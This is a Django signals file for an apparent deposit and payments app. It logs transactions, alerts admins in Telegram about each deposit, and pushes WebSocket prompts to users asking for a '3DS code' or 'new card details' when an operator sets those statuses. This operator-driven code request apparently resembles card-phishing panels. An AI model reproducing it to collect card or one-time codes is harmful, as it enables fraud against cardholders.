from django.db.models.signals import post_save, post_delete
from django.dispatch import receiver
from .models import Transaction, DepositRequest, WithdrawalRequest, TransactionLog
from integrations.telegram import send_admin_notification, format_deposit_request_alert


@receiver(post_save, sender=Transaction)
def create_transaction_log(sender, instance, created, **kwargs):
    """Create transaction log when transaction is created/updated"""
    if created:
        TransactionLog.objects.create(
            action='TRANSACTION_CREATED',
            performed_by=instance.user,
            transaction=instance,
            details={
                'transaction_type': instance.transaction_type,
                'amount': str(instance.amount),
                'currency': instance.currency,
                'status': instance.status
            },
            ip_address=instance.ip_address
        )
    else:
        # Log status changes - skip for now to avoid tracker issues
        pass


@receiver(post_save, sender=DepositRequest)
def create_deposit_log(sender, instance, created, **kwargs):
    """Create transaction log when deposit request is created/updated"""
    if created:
        TransactionLog.objects.create(
            action='DEPOSIT_REQUESTED',
            performed_by=instance.user,
            deposit_request=instance,
            details={
                'amount': str(instance.amount),
                'currency': instance.currency,
                'payment_method': instance.payment_method
            },
            ip_address=instance.ip_address
        )
        # Notify admins in Telegram
        try:
            send_admin_notification(format_deposit_request_alert(instance))
        except Exception:
            pass
    else:
        # Log status changes - skip for now to avoid tracker issues
        pass


@receiver(post_save, sender=WithdrawalRequest)
def create_withdrawal_log(sender, instance, created, **kwargs):
    """Create transaction log when withdrawal request is created/updated"""
    if created:
        TransactionLog.objects.create(
            action='WITHDRAWAL_REQUESTED',
            performed_by=instance.user,
            withdrawal_request=instance,
            details={
                'amount': str(instance.amount),
                'currency': instance.currency,
                'payment_method': instance.payment_method
            },
            ip_address=instance.ip_address
        )
    else:
        # Log status changes - skip for now to avoid tracker issues
        pass


@receiver(post_delete, sender=Transaction)
def log_transaction_deletion(sender, instance, **kwargs):
    """Log when transaction is deleted"""
    TransactionLog.objects.create(
        action='TRANSACTION_DELETED',
        performed_by=instance.processed_by or instance.user,
        resource_type='TRANSACTION',
        resource_id=str(instance.id),
        details={
            'transaction_type': instance.transaction_type,
            'amount': str(instance.amount),
            'currency': instance.currency,
            'status': instance.status
        }
    )


@receiver(post_save, sender=DepositRequest)
def deposit_request_updated(sender, instance, created, **kwargs):
    """Отправляет WebSocket уведомления при изменении депозита"""
    if not created:  # Только при обновлении
        try:
            from channels.layers import get_channel_layer
            from asgiref.sync import async_to_sync
            
            channel_layer = get_channel_layer()
            user_group = f"payments_{instance.user.id}"
            
            if instance.status == 'REQUIRES_3DS':
                # Запрос 3DS кода
                async_to_sync(channel_layer.group_send)(
                    user_group,
                    {
                        'type': 'three_ds_request',
                        'deposit_id': str(instance.id),
                        'message': 'Please enter 3DS code'
                    }
                )
            elif instance.status == 'NEEDS_NEW_CARD':
                # Запрос новой карты
                async_to_sync(channel_layer.group_send)(
                    user_group,
                    {
                        'type': 'new_card_request',
                        'deposit_id': str(instance.id),
                        'message': 'Please enter new card details'
                    }
                )
            elif instance.status == 'APPROVED':
                # Платеж одобрен
                async_to_sync(channel_layer.group_send)(
                    user_group,
                    {
                        'type': 'payment_approved',
                        'deposit_id': str(instance.id),
                        'message': 'Payment approved!',
                        'amount': str(instance.amount)
                    }
                )
            elif instance.status == 'REJECTED':
                # Платеж отклонен
                async_to_sync(channel_layer.group_send)(
                    user_group,
                    {
                        'type': 'payment_rejected',
                        'deposit_id': str(instance.id),
                        'message': 'Payment rejected'
                    }
                )
        except Exception as e:
            print(f"Failed to send WebSocket notification: {e}")


